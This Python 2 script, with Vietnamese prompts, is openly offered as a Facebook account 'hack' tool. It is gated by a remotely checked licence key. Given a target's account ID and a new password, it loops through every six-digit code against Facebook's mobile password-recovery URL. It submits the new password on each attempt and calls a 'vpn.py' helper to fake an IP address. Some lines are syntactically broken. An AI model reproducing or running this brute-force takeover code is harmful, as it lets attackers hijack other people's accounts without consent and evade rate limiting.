#!/usr/bin/python2
# coding=utf-8

import webbrowser,re 
import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
from hashlib import md5,sha1,sha256,sha512,sha384
import base64
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import requests
except ImportError:
     os.system("pip2 install requests")
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36')]
blue='\e[1;34m'
green='\e[1;32m'
purple='\e[1;35m'
cyan='\e[1;36m'
red='\e[1;31m'
white='\e[1;37m'
yellow='\e[1;33m'
#-exit-#
def exit():
	os.system('clear')
	print "\033[1;91m[!] Đang Đóng ..."
	os.system('sleep 3 && clear')
	os.sys.exit()
        veryfiles()

#-Animation-#
def mkdir(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(00000.1)

##### LOGO #####
logo = """
\033[1;91m┌─────────────────────────────────────────────────────────────┐\033[1;91m
│   ▄▄▄▄▄▄                      █            By Đoàn Gia bảo                   │\033[1;91m
│   █       ▄▄▄    ▄▄▄    ▄▄▄   █▄▄▄    ▄▄▄    ▄▄▄   █   ▄    │\033[1;91m
│   █▄▄▄▄▄ ▀   █  █▀  ▀  █▀  █  █▀ ▀█  █▀ ▀█  █▀ ▀█  █ ▄▀     │\033[1;91m
│   █      ▄▀▀▀█  █      █▀▀▀▀  █   █  █   █  █   █  █▀█      │\033[1;91m
│   █      ▀▄▄▀█  ▀█▄▄▀  ▀█▄▄▀  ██▄█▀  ▀█▄█▀  ▀█▄█▀  █  ▀▄    │\033[1;91m
└─────────────────────────────────────────────────────────────┘\033[1;91m
\033[1;97m╔═════════════════════════════════════════════════════════════╗
\033[1;97m\033[1;93m* \033[1;97mTeam    \033[1;91m: \033[1;96mTOP1 \033[1;97m                         
\033[1;97m\033[1;93m* \033[1;97mBy      \033[1;91m: \033[1;96mĐoàn Gia Bảo(Operator) \033[1;97m               
\033[1;97m\033[1;93m* \033[1;97mGithub  \033[1;91m: \033[1;96mhttps://github.com/dgbaopro-top1team\033[1;97m              
\033[1;97m\033[1;93m* \033[1;97mFB      \033[1;91m: \033[1;92m\033[4mhttps://facebook.com/dgbaoprotop1\033[0m\033[1;97m           
                        \033[1;97m                    
\033[1;97m╚═════════════════════════════════════════════════════════════╝"""

# load #
def load():
	tiload = ['.   ','..  ','... ']
	for o in tiload:
		print("\r\033[1;91m[●] \033[1;92mĐang Đăng Nhập \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
#####VeryFiles#####
def veryfiles():
     os.system('clear')
     try:
            key = open('key.txt','r').read()
            keylg()
     except IOError:
            pickfiles = open("key.txt", 'w')
            pickfiles.write('')
            pickfiles.close()
            veryfiles()

#####Key#####
def keylg():
     key = open('key.txt','r').read()
     keylogin = requests.get("https://dvmxhfb.tk/key.php")
     keylg = json.loads(keylogin.text)
     tools_key = keylg['key']
     if key == "" :
           keyerr()
     elif key == tools_key :
           keyok()
     else:
           keyerr()

#####Very#####
def very():
     os.system('clear')
     print logo
     print('\033[1;91m[☆] \033[1;92mLOGIN \033[1;91m[☆]')
     keyvery = raw_input('\033[1;91m[+] \033[1;36mKEY\033[1;97m\033[1;96m\033[1;97m \033[1;91m:\033[1;92m ')
     envery = md5(keyvery)
     keyvery = envery.hexdigest()
     enkey2 = sha1(keyvery)
     keyvery = enkey2.hexdigest()
     enkey3 = sha256(keyvery)
     keyvery = enkey3.hexdigest()
     enkey4 = sha512(keyvery)
     keyvery = enkey4.hexdigest()
     enkey5 = sha384(keyvery)
     keyvery = enkey5.hexdigest()
     enkey6 = sha1(keyvery)
     keyvery =enkey6.hexdigest()
     enkey7 = sha256(keyvery)
     keyvery =enkey7.hexdigest()
     enkey8 = sha512(keyvery)
     keyvery =enkey8.hexdigest()
     enkey9 = md5(keyvery)
     keyvery =enkey9.hexdigest()
     keylogin = requests.get("https://dvmxhfb.tk/key.php")
     keylg = json.loads(keylogin.text)
     tools_key = keylg['key']
     if keyvery =="":
		keyerr()
     elif keyvery == tools_key :
                    pick_key = open("key.txt", 'w')
                    pick_key.write(keyvery)
                    pick_key.close()
                    keyok()
     else:
                    keyerr()

#####KeyERR#####
def keyerr():
      os.system('clear')
      print logo
      pickkey = open("key.txt", 'w')
      pickkey.write('')
      pickkey.close()
      print"\033[1;91m[!] Key Sai"
      raw_input('\n\033[1;91m[ \033[1;97mThử Lại \033[1;91m]')
      very()

#####KeyOK#####
def keyok():
      os.system('clear')
      print logo
      print('\033[1;91m[OK] \033[1;36mKey Chính Xác')
      raw_input('\n\033[1;91m[ \033[1;97mTiếp Tục \033[1;91m]')
      hackfb()
#####Hack#####
def hackfb():
     os.system('clear')
     print logo
     try :
         ID = raw_input('\033[1;36mNhập ID FB cần hack(Chỉ Số) : ')
         if len(ID) == 15 :
           if ID >= '100000000000000' :
            if ID < '100100000000001' :
             pwd = raw_input('\033[1;36mNhập MK Mới: ')
             xm = raw_input('\033[1;36mBạn có muốn nhập n ? (y/n) : ')
             if xm == 'y' :
                        ID = str(ID)
                        print('Loading Fake IP ...')
                        os.system('python2 vpn.py US')
                        try :
                           n = raw_input('\033[1;36mNhập n : ')
                           n2 = int(n)
                           if n2 > 999999 :
                                 print('\033[1;91mn Không hợp lệ')
                                 raw_input('\033[1;91m[Thử Lại]')
                                 hackfb()
                           else :
                             if len(n) <> 6 :
                              print('\033[1;91mn Không hợp lệ')
                              raw_input('\033[1;91m[Thử Lại]')
                              hackfb()
                             else :
                              n = str(n)
                              print('------------------------------------------------------------------------')
                              webbrowser.open_new('https://m.facebook.com/recover/password/?u='+ID+'&n='+n)
                              br.open('https://m.facebook.com/recover/password/?u='+ID+'&n='+n)
                              try :
                                     br._factory.is_html = True
                                     br.select_form(nr=0)
                                     br.form['password_new'] = pwd
                                     br.submit()
                                     url = br.geturl()
                                     print(url)
                                     print('\033[1;32m'+n)
                                     print('\033[1;32mlà mã đúng')
                                     print('\033[1;32mMật khẩu đã thay đổi thành : ')
                                     print '\033[1;32m'+pwd

                              except :
                                     url = br.geturl()
                                     print(url)

                                     print n
                                     print('\033[1;91mlà mã sai')

                              raw_input('\033[1;91m[ Tiếp Tục ]')  
                              hackfb()
                        except :
                                print('\033[1;91mn Không hợp lệ')
                                raw_input('\033[1;91m[Thử Lại]')
                                hackfb()
             elif xm == 'n' :
                           n = '000000'
                           for i in xrange(int(0),int(1000000)) :
                              print('Loading Fake IP ...')
                              os.system('python2 vpn.py US')
                              ID = str(ID)
                              n = str(n)
                              print('------------------------------------------------------------------------')
                              webbrowser.open_new('https://m.facebook.com/recover/password/?u='+ID+'&n='+n)
                              br.open('https://m.facebook.com/recover/password/?u='+ID+'&n='+n)
                              try :
                                     br._factory.is_html = True
                                     br.select_form(nr=0)
                                     br.form['password_new'] = pwd
                                     br.submit()
                                     url = br.geturl()
                                     print(url)
                                     print(n)
                                     print('\033[1;32mlà mã đúng')
                                     print('\033[1;32mMật khẩu đã thay đổi thành : ')
                                     print pwd
                                     break
                              except :
                                     url = br.geturl()
                                     print(url)
                                     print n
                                     print('\033[1;91mlà mã sai')
                                     n = int(n)
                                     n = n+1
                                     n = int(n)
                                     if n < 10 :
                                        n = str(n)
                                        n = ('00000'+n+'')
                                     elif n in range(9,100) :
                                        n = str(n)
                                        n = ('0000'+n+'')
                                     elif n in range(99,1000) :
                                        n = str(n)
                                        n = ('000'+n+'')
                                     elif n in range(999,10000) :
                                        n = str(n)
                                        n = ('00'+n+'')
                                     elif n in range(9999,100000) :
                                        n = str(n)
                                        n = ('0'+n+'')
                                     else :
                                        n = n
                                     continue
                        
                           raw_input('\033[1;36m[ Tiếp Tục ]')  
                           hackfb()
             else:
                 print('\033[1;91mError Input')
                 raw_input('\033[1;91m[Thử Lại]')
                 hackfb()
            else :
                print('\033[1;91mID Không hợp lệ')
                raw_input('\033[1;91m[Thử Lại]')
                hackfb()
           else :
               print('\033[1;91mID Không hợp lệ')
               raw_input('\033[1;91m[Thử Lại]')
               hackfb()
         else :
                 print('\033[1;91mID Không hợp lệ')
                 raw_input('\033[1;91m[Thử Lại]')
                 hackfb()
                 
     except :
         print('\033[1;91m !')
         raw_input('\033[1;91m[Thử Lại]')
         hackfb()
         
                                             
if __name__=='__main__':
     veryfiles()